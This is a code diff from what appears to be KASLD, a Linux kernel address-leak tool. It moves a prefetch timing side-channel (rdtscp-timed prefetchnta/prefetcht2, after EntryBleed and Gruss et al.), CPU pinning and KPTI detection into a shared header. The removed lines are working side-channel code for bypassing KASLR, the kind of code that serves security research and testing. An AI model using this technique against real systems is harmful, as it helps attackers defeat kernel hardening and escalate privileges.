@@ -91,8 +91,7 @@
 
 #define _GNU_SOURCE
 #include "include/kasld.h"
-#include <sched.h>
-#include <stdint.h>
+#include "include/sidechannel.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -111,128 +110,6 @@ KASLD_META("method:timing\n"
            "hardware:KPTI\n");
 
 static int verbose = 0;
-
-#define CPU_VENDOR_UNKNOWN 0
-#define CPU_VENDOR_AMD 1
-#define CPU_VENDOR_INTEL 2
-
-// ---------------------------------------------------------------------------
-// Check for rdtscp support via CPUID (function 0x80000001, EDX bit 27).
-// Returns 1 if rdtscp is available, 0 otherwise.
-// ---------------------------------------------------------------------------
-static int has_rdtscp(void) {
-  unsigned int eax, ebx, ecx, edx;
-  __asm__ volatile("cpuid"
-                   : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
-                   : "a"(0x80000001)
-                   :);
-  return (edx >> 27) & 1;
-}
-
-// ---------------------------------------------------------------------------
-// CPU pinning - reduce noise from cross-core migration
-// ---------------------------------------------------------------------------
-static void pin_to_cpu(int cpu) {
-  cpu_set_t set;
-  CPU_ZERO(&set);
-  CPU_SET(cpu, &set);
-  sched_setaffinity(0, sizeof(set), &set);
-}
-
-// ---------------------------------------------------------------------------
-// Detect CPU vendor from /proc/cpuinfo.
-// Returns CPU_VENDOR_AMD, CPU_VENDOR_INTEL, or CPU_VENDOR_UNKNOWN.
-// ---------------------------------------------------------------------------
-static int detect_cpu_vendor(void) {
-  int cpu = CPU_VENDOR_UNKNOWN;
-  FILE *f = fopen("/proc/cpuinfo", "r");
-  if (!f)
-    return cpu;
-
-  char *line = NULL;
-  size_t len = 0;
-  while (getline(&line, &len, f) != -1) {
-    if (strstr(line, "vendor") == NULL)
-      continue;
-    if (strstr(line, "AuthenticAMD") != NULL) {
-      cpu = CPU_VENDOR_AMD;
-      break;
-    }
-    if (strstr(line, "GenuineIntel") != NULL) {
-      cpu = CPU_VENDOR_INTEL;
-      break;
-    }
-  }
-  free(line);
-  fclose(f);
-  return cpu;
-}
-
-// ---------------------------------------------------------------------------
-// Check if KPTI is enabled (presence of "pti" in /proc/cpuinfo flags).
-// Returns 1 if KPTI is enabled, 0 otherwise.
-// ---------------------------------------------------------------------------
-static int detect_kpti(void) {
-  FILE *f = fopen("/proc/cpuinfo", "r");
-  if (!f)
-    return -1;
-
-  char *line = NULL;
-  size_t len = 0;
-  int pti = 0;
-
-  while (getline(&line, &len, f) != -1) {
-    if (strstr(line, "flags") == NULL)
-      continue;
-    if (strstr(line, " pti") != NULL) {
-      pti = 1;
-      break;
-    }
-  }
-
-  free(line);
-  fclose(f);
-  return pti;
-}
-
-// ---------------------------------------------------------------------------
-// Prefetch side-channel measurement.
-//
-// Issues prefetchnta + prefetcht2 on the target address bracketed by
-// serialising instructions (mfence/lfence) and timed with rdtscp.
-//
-// The double-prefetch (NTA then T2) amplifies the timing differential
-// as described in Gruss et al.
-//
-// Measurement sequence based on EntryBleed PoC by Will.
-// ---------------------------------------------------------------------------
-static uint64_t time_prefetch(uint64_t addr) {
-  uint64_t t0_lo, t0_hi, t1_lo, t1_hi;
-
-  __asm__ volatile(".intel_syntax noprefix;"
-                   "mfence;"
-                   "rdtscp;"
-                   "mov %0, rax;"
-                   "mov %1, rdx;"
-                   "xor rax, rax;"
-                   "lfence;"
-                   "prefetchnta qword ptr [%4];"
-                   "prefetcht2 qword ptr [%4];"
-                   "xor rax, rax;"
-                   "lfence;"
-                   "rdtscp;"
-                   "mov %2, rax;"
-                   "mov %3, rdx;"
-                   "mfence;"
-                   ".att_syntax;"
-                   : "=r"(t0_lo), "=r"(t0_hi), "=r"(t1_lo), "=r"(t1_hi)
-                   : "r"(addr)
-                   : "rax", "rbx", "rcx", "rdx");
-
-  uint64_t t0 = (t0_hi << 32) | t0_lo;
-  uint64_t t1 = (t1_hi << 32) | t1_lo;
-  return t1 - t0;
-}
 
 // ---------------------------------------------------------------------------
 // Collect per-slot timing data.
@@ -456,7 +333,7 @@ static unsigned long majority_vote(int cpu_vendor) {
 // ---------------------------------------------------------------------------
 static unsigned long get_kernel_addr_prefetch(void) {
   int cpu = detect_cpu_vendor();
-  int pti = detect_kpti();
+  bool pti = detect_kpti();
 
   if (cpu == CPU_VENDOR_UNKNOWN)
     printf("[.] unknown CPU vendor, assuming Intel-like behavior\n");
@@ -468,19 +345,16 @@ static unsigned long get_kernel_addr_prefetch(void) {
     return 0;
   }
 
-  if (pti == 1) {
+  if (pti) {
     fprintf(stderr,
             "[-] KPTI is enabled; prefetch side-channel is ineffective\n"
             "    (kernel pages unmapped from userspace page tables)\n");
     return 0;
   }
 
-  if (pti == 0)
-    printf("[.] KPTI is disabled\n");
-  else
-    printf("[.] unable to determine KPTI status, proceeding anyway\n");
+  printf("[.] KPTI is not detected\n");
 
-  pin_to_cpu(0);
+  pin_cpu(0);
 
   unsigned long addr = majority_vote(cpu);
 
